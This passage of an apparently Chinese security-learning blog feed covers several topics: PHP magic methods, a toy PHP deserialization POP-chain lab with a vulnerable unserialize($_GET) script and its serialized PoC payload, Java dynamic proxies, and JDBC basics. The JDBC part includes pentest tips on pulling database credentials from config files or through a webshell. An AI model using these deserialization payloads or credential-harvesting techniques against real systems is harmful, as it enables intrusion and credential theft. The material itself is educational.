class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;销毁时调用\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$property, $value</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;$property = $value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$name</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;$name;<br>    &#125;<br>&#125;<br><br>$t = <span class="hljs-keyword">new</span> Test(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>);<br><span class="hljs-keyword">echo</span> $t-&gt;uname;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>$t-&gt;uname = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-keyword">echo</span> $t-&gt;uname;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="D:\markdown\image-20211020235505059.png" alt="image-20211020235505059"></p><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p>如果你试着调用一个对象中不存在或被权限控制中的方法，它就会被自动调用</p><p><img src="D:\markdown\image-20211021183145903.png" alt="image-20211021183145903"></p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>把类当成字符串使用时自动调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021211818736.png" alt="image-20211021211818736"></p><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><p>将类当成函数方法时调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021212227538.png" alt="image-20211021212227538"></p><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p>定义这个魔术方法方便我们在类外测试类中是否定义了某个私有变量</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021214354276.png" alt="image-20211021214354276"></p><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><p>销毁一个类的私有变量，当销毁一个不存在的属性时也会自动调用 <code>__unset()</code> 函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021231856031.png" alt="image-20211021231856031"></p><h3 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h3><p>当创建一个静态方法以调用该类中不存在的一个方法时使用此函数，与 <code>__call()</code> 相同</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021232730554.png" alt="image-20211021232730554"></p><h2 id="POP链构造测试"><a href="#POP链构造测试" class="headerlink" title="POP链构造测试"></a>POP链构造测试</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023222416562.png" alt="image-20211023222416562"></p><p>构造简单的 POP 链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$test2,$arr</span>)</span><br><span class="hljs-function">        </span>&#123;<br>                $s1 = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                $s1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvokeFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ToStringFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $str1;<br>        <span class="hljs-keyword">public</span> $str2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;flag&#123;Success&#125;&quot;</span>;<br>        &#125;<br>&#125;<br>$a = $_GET[<span class="hljs-string">&#x27;string&#x27;</span>];<br>unserialize($a);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> CallFunc();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1 =<span class="hljs-keyword">new</span> InvokeFunc();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvokeFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1 ;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> ToStringFunc();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ToStringFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $str1 ;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;str1 = <span class="hljs-keyword">new</span> GetFlag();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span>;<br>        &#125;<br>&#125;<br>$a = <span class="hljs-keyword">new</span> start_gg();<br><span class="hljs-keyword">echo</span> serialize($a);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//     O:8:&quot;start_gg&quot;:1:&#123;s:4:&quot;mod1&quot;;O:8:&quot;CallFunc&quot;:1:&#123;s:4:&quot;mod1&quot;;O:10:&quot;InvokeFunc&quot;:1:&#123;s:4:&quot;mod1&quot;;O:12:&quot;ToStringFunc&quot;:1:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这里我直接倒着分析的首先我们想要调用<code>get_flag()</code>方法获取到结果就需要执行<code>__toString()</code> 方法，这里看到可以利用 <code>InvokeFunc</code> 类中的 <code>__invoke()</code> 方法，就需要调用 <code>CallFunc</code> 类中的 <code>__call()</code> 方法，就需要使用 <code>star_gg</code> 类中的析构函数。这样一条链子就可以 </p><p><code>start_gg-&gt;__destruct()  --&gt; CallFunc-&gt;__call() --&gt;InvokeFunc-&gt;__invoke()  --&gt; ToStringFunc-&gt;__toString() --&gt; GetFlag-&gt;get_flag()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023225653694.png" alt="image-20211023225653694"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>熟练使用这些函数有助于后面我们可以更快捷的构建出反序列化 POP 链，如果还有遗漏的后期补上。</p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代理</title>
    <link href="/2021/10/19/Java%E4%BB%A3%E7%90%86/"/>
    <url>/2021/10/19/Java%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Java代理"><a href="#Java代理" class="headerlink" title="Java代理"></a>Java代理</h1><p>当一个对象不能直接使用，可以创建一个客户端和目标对象直接创建一个中介，这个中介就是代理</p><p>代理模式是通过代理对象访问目标对象，这样可以在目标对象基础上增强额外功能</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211017142945434.png" alt="image-20211017142945434"></p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理比较简单，就是代理对象与被代理对象继承相同的接口，代理对象负责调用被代理类（委托类）的对象的相关方法去提供具体的服务，一个代理类只能为一个接口服务，要是有很多服务的话需要开很多代理类。</p><ol><li>代理类是自己手工实现的，自己创建的java类，表示代理类</li><li>代理的目标是确定的</li></ol><p>优点：容易实现，使用方便</p><p>缺点：在目标类比较多时，会产生大量的代理类；当接口改变时，影响的目标类多</p><p>例：</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211017154240849.png" alt="image-20211017154240849"></p><blockquote><p>如果需要扩展函数功能可以直接在代理类中修改即可</p></blockquote><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>动态代理是由反射实现，可以用一个代理类实现所有的代理功能。</p><ul><li>不用创建动态代理类</li><li>可以给不同目标随时创建代理</li></ul><p>动态代理的实现：</p><ol><li>JDK动态代理<ul><li>使用java反射包中的类和接口实现动态代理的功能</li><li>反射包：<code>java.lang.reflect</code> 里面有三个类：<code>InvocationHandler</code>  <code>Method</code>  <code>Proxy</code></li></ul></li><li>cglib 动态代理<ul><li>cglib 是第三方工具库，创建代理对象</li><li>cglib 的原理是继承，cglib 通过继承目标类，创建子类，在子类中重写父类中同名的方法</li><li>cglib 是继承，重写方法，所以要求目标类和方法不能是 final，cglib 再框架中使用</li></ul></li></ol><p>创建动态代理类实例可以使用<code>newProxyInstance()</code>或者使用<code>getProxyClass()</code>获取代理对象再使用反射的方法创建      </p><p><strong>实现动态代理的步骤</strong></p><ol><li>创建接口</li><li>定义目标类实现该接口方法</li><li>实现 <code>InvocationHandler</code> 接口，重写 <code>invoke</code> 方法，完成代理的功能</li><li>使用 <code>Proxy</code> 类的静态方法，创建代理对象。并把返回值转为接口类型</li></ol><p>例：</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211019190539572.png" alt="image-20211019190539572"></p><ul><li>创建动态代理类的时候主要是实现 <code>InvokationHandler</code> 接口，重写 <code>invoke</code> 方法</li><li>调用代理类的时候 创建代理对象，创建 <code>InvokationHandler</code> 对象, 创建代理对象（参数固定就是那些，返回值为接口类）就可以执行函数方法了</li><li>运行代理类时会自动调用动态代理的invoke方法</li></ul><p> <code>InvokationHandler</code> 接口中定义了一个 <code>invoke</code> 方法，所以需要在动态代理类中重写一下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211019195340609.png" alt="image-20211019195340609"></p><h2 id="代理类与序列化"><a href="#代理类与序列化" class="headerlink" title="代理类与序列化"></a>代理类与序列化</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211019222558776.png" alt="image-20211019222558776"></p><p><img src="D:\markdown\image-20211019223756860.png" alt="image-20211019223756860"></p><blockquote><p>这里为什么会调用 <code>invoke</code> 方法呢？？？？</p></blockquote><p>下面这段些话还有点不懂，应该是序列化与反序列化还不太熟悉吧</p><p>动态代理生成的类在 <code>序列化/反序列化</code> 时不会序列化该类的成员变量，并且 <code>serialVersionUID</code> 为 <code>0L</code>， 也就是说将该类的 Class 对象传递给<code>java.io.ObjectStreamClass</code> 的静态 lookup 方法时，返回的 <code>ObjectStreamClass</code> 实例将具有以下特性</p><ol><li>调用其<code>getSerialVersionUID</code>方法将返回 0L</li><li>调用其<code>getFields</code>方法将返回长度为零的数组</li><li>调用其<code>getField</code>方法将返回 null </li></ol><p>但其父类 <code>(java.lang.reflect.Proxy)</code> 在序列化时不受影响，父类中的h变量<code>(InvocationHandler)</code> 将会被序列化，这个h存储了动态代理类的处理类实例以及动态代理的接口类的实现类的实例。</p><p>动态代理生成的对象 <code>(com.sun.proxy.$ProxyXXX)</code> 序列化的时候会使用一个特殊的协议：<code>TC_PROXYCLASSDESC(0x7D)</code>，这个常量在 <code>java.io.ObjectStreamConstants</code> 中定义的。在反序列化时也不会调用 <code>java.io.ObjectInputStream</code> 类的 <code>resolveClass</code> 方法而是调用<code>resolveProxyClass</code> 方法来转换成类对象的。</p><p>参考文章</p><p><a href="https://www.cnblogs.com/whirly/p/10154887.html">https://www.cnblogs.com/whirly/p/10154887.html</a></p><p><a href="https://www.jianshu.com/p/9bcac608c714">https://www.jianshu.com/p/9bcac608c714</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/12260664.html">https://www.cnblogs.com/tr1ple/p/12260664.html</a></p><p><a href="https://zhishihezi.net/endpoint/richtext/513dfa85670cfe82b2cb0e0a8dea90a6?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d0057ad43cf2e97752fad0abee3e598bf4f94d76ce28e69a8146f48c8b37aa7ba51d148a839377b8b90b048c05cdd6fe9eb12e85a55d5fc174a7a2fd1c12a0abb871c23c660e98fd8e5db055d4bc9958fdd7dd47cc0445ebc45363cde3acf346fdb89ead4d58a648c2ead5a0fd884caeeaa30eea2e34a9986b03f7468edef74549e6162894fe866453287a887800f0371d50e391c5f0045451669ed87b54fb6e390729a7627a22ed567852464585f64c0091cba2c6e699f22b14f29f272273e5e27#0">https://zhishihezi.net/endpoint/richtext/513dfa85670cfe82b2cb0e0a8dea90a6?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d0057ad43cf2e97752fad0abee3e598bf4f94d76ce28e69a8146f48c8b37aa7ba51d148a839377b8b90b048c05cdd6fe9eb12e85a55d5fc174a7a2fd1c12a0abb871c23c660e98fd8e5db055d4bc9958fdd7dd47cc0445ebc45363cde3acf346fdb89ead4d58a648c2ead5a0fd884caeeaa30eea2e34a9986b03f7468edef74549e6162894fe866453287a887800f0371d50e391c5f0045451669ed87b54fb6e390729a7627a22ed567852464585f64c0091cba2c6e699f22b14f29f272273e5e27#0</a></p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDBC基础</title>
    <link href="/2021/10/15/JDBC%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/10/15/JDBC%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="JDBC-基础"><a href="#JDBC-基础" class="headerlink" title="JDBC 基础"></a>JDBC 基础</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JDBC 是java 提供对数据库就行连接，操作得标准 API，Java 自身并不会去实现对数据库得连接查询更新等操作而是通过抽象出数据库操作的 API 接口（JDBC）。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>Java通过<code>java.sql.DriverManager</code>来管理所有数据库的驱动注册，所以如果想要建立数据库连接需要先在<code>java.sql.DriverManager</code>中注册对应的驱动类，然后调用<code>getConnection</code>方法才能连接上数据库。</p><p>JDBC定义了一个叫<code>java.sql.Driver</code>的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。<code>java.sql.DriverManager.getConnection(xx)</code>其实就是间接的调用了<code>java.sql.Driver</code>类的<code>connect</code>方法实现数据库连接的。数据库连接成功后会返回一个叫做<code>java.sql.Connection</code>的数据库连接对象，一切对数据库的查询操作都将依赖于这个<code>Connection</code>对象。</p><p>JDBC连接数据库的一般步骤:</p><ol><li>注册驱动 <code>Class.forName(&quot;数据库驱动的类名&quot;)</code></li><li>获取连接 <code>DriverManager.getConnection()</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">String CLASS_NAME = <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<br>String URL = <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/mysql&quot;</span><br>String USERNAME = <span class="hljs-string">&quot;root&quot;</span>;<br>String PASSWORD = <span class="hljs-string">&quot;root&quot;</span>;<br><br>Class.forName(CLASS_NAME);<span class="hljs-comment">// 注册JDBC驱动类</span><br>Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);<br></code></pre></td></tr></table></figure><p><strong>数据库配置信息</strong></p><p>传统的 Web 应用数据库配置信息一般都是存在 <code>WEB-INF</code> 目录下的 <code>*.properties</code> <code>*.yml</code> <code>*.xml</code>中的，如果是 <code>Spring Boot</code> 项目的话一般都存储在 <code>src/main/resources/</code> 目录下。常见的数据库配置信息的路径：<code>WEB-INF/applicationContext.xml</code> <code>WEB-INF/hibernate.cfg.xml</code> <code>WEB-INF/jdbc/jdbc.properties</code> </p><p><strong>为什么开始的时候需要 <code>Class.forName()</code> ?</strong></p><p>这一步利用了 java 反射 + 类加载机制往 <code>DriverManager</code> 中注册了驱动包，它实际上会触发类加载，<code>com.mysql.jdbc.Driver</code> 类将会被初始化，<code>static静态语句块</code> 中的代码会被执行。但是有些时候没有 <code>Class.forName()</code> 程序也可以正常运行，这是因为 Java SPI机制。因为<code>DriverManager</code>在初始化的时候会调用<code>java.util.ServiceLoader</code>类提供的SPI机制，Java会自动扫描jar包中的<code>META-INF/services</code>目录下的文件，并且还会自动的<code>Class.forName(文件中定义的类)</code>，这也就解释了为什么不需要<code>Class.forName</code>也能够成功连接数据库的原因了。</p><p><strong>Java SPI</strong></p><p>SPI(Service Provider Interface)，是JDK内置的一种服务提供发现机制。它就是一种动态替换发现机制。例如：有个接口想在运行时才发现具体的实现类，那么你只需要在程序运行前添加一个实现即可，并把新加的实现描述给JDK即可。此外，在程序的运行过程中，也可以随时对该描述进行修改，完成具体实现的替换。</p><p>Java提供了很多服务提供者接口（Service Provider Interface，SPI），允许第三方为这些接口提供实现。常见的SPI有JDBC、JCE、JNDI、JAXP和JBI等。</p><h2 id="数据库连接思考"><a href="#数据库连接思考" class="headerlink" title="数据库连接思考"></a>数据库连接思考</h2><ol><li>SPI机制是否有安全性问题？</li><li>Java反射有那些安全问题？</li><li>Java类加载机制是什么？</li><li>数据库连接时密码安全问题？</li><li>使用JDBC如何写一个通用的数据库密码爆破模块？</li></ol><h2 id="DataSource"><a href="#DataSource" class="headerlink" title="DataSource"></a>DataSource</h2><p>在真实的 Java 项目中通常不会使用原生的 <code>JDBC</code> 的 <code>DiverManager</code> 去连接数据库，而是使用数据源(<code>javax.sql.DataSource</code>) 来代替 <code>DriverManager</code> 管理数据库的连接，一般情况下 WEB 服务在启动时就会预先定义好数据源，这样就不需要编写任何数据库相关的连接代码了，直接引用 <code>DataSource</code> 对象即可获取数据库的连接。常见的数据源有：<code>DBCP</code> <code>C3P0</code> <code>Druid</code> <code>Mybatis DataSource</code> 他们都实现于 <code>javax.sql.DataSourcec</code> 接口。</p><p>在渗透测试中我们可以通过查找 Spring 数据库配置信息的找到数据库账户密码，但是很多时候我们可以找到非常多的配置项甚至是加密的配置信息。这样我们难以确定真实的数据库配置信息，所以我们可以在<code>webshell</code> 中使用注入数据源的方式来获取数据库连接对象，甚至是读取数据库密码。</p><p>参考文章</p><p><a href="https://zhishihezi.net/endpoint/richtext/6d9a22ba0a35a008c8a26de9be0af285?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d003f2aa7f127f0eebacd7781dfcc96fffc113c2aa6524a270d806d0b5cb74fcd848dc0e71a1806ba8aa6795310d7f5156f8679b530f66f98d69bcca054b7161d0311712560fdab58f84fb9f475c33e2307e1d1bf7f16cb4b78ffb1de583bcb8bdc68ff1a4b3c274eeb49ebe71ce5cc010855f8493aa598d6535c728e2b2e0c78623ece5513ef7d2037e1aa34c9180a9217120669f13f79be67e876422272b76e9a39062c8f6f4f45182f7f0d2dfab296e83843031274d8b7d87c8e39e3921eb4b9#2">https://zhishihezi.net/endpoint/richtext/6d9a22ba0a35a008c8a26de9be0af285?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d003f2aa7f127f0eebacd7781dfcc96fffc113c2aa6524a270d806d0b5cb74fcd848dc0e71a1806ba8aa6795310d7f5156f8679b530f66f98d69bcca054b7161d0311712560fdab58f84fb9f475c33e2307e1d1bf7f16cb4b78ffb1de583bcb8bdc68ff1a4b3c274eeb49ebe71ce5cc010855f8493aa598d6535c728e2b2e0c78623ece5513ef7d2037e1aa34c9180a9217120669f13f79be67e876422272b76e9a39062c8f6f4f45182f7f0d2dfab296e83843031274d8b7d87c8e39e3921eb4b9#2</a></p><p><a href="https://www.jianshu.com/p/e4262536000d">https://www.jianshu.com/p/e4262536000d</a></p><p><a href="https://blog.csdn.net/qq_27292113/article/details/100324127">https://blog.csdn.net/qq_27292113/article/details/100324127</a></p><p><a href="https://zhishihezi.net/endpoint/richtext/7cf5943a331e912a8ced8264b65ba4a4?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00fc7ce3fe3cc9fffd10a895293a0425000f798ef1f4285bc4615898486a533462dd5cc0aa1f49f370afa6cd415c847e879b80964a7cb47f9a65a3a3eec81b131c19d0650b1955cf6e77d0293a369bc09e0299b0f9c58f7226ee6c6df1f94abf9ad020bcff67e838b4fe63a4aaadcf14a330023e181ca50a45e91822ebb11299dff426c4e8dcaa968b62df740cfce6b4480a215dc739f8028c6c29d6d1079bf4dd3e70addaaf843b9fa061943758d25bb1a9ef2983de1ecbd6ca659e367482affd#1">https://zhishihezi.net/endpoint/richtext/7cf5943a331e912a8ced8264b65ba4a4?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00fc7ce3fe3cc9fffd10a895293a0425000f798ef1f4285bc4615898486a533462dd5cc0aa1f49f370afa6cd415c847e879b80964a7cb47f9a65a3a3eec81b131c19d0650b1955cf6e77d0293a369bc09e0299b0f9c58f7226ee6c6df1f94abf9ad020bcff67e838b4fe63a4aaadcf14a330023e181ca50a45e91822ebb11299dff426c4e8dcaa968b62df740cfce6b4480a215dc739f8028c6c29d6d1079bf4dd3e70addaaf843b9fa061943758d25bb1a9ef2983de1ecbd6ca659e367482affd#1</a></p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java命令执行</title>
    <link href="/2021/10/15/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2021/10/15/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-命令执行"><a href="#Java-命令执行" class="headerlink" title="Java 命令执行"></a>Java 命令执行</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//字符串转字节数组</span><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span 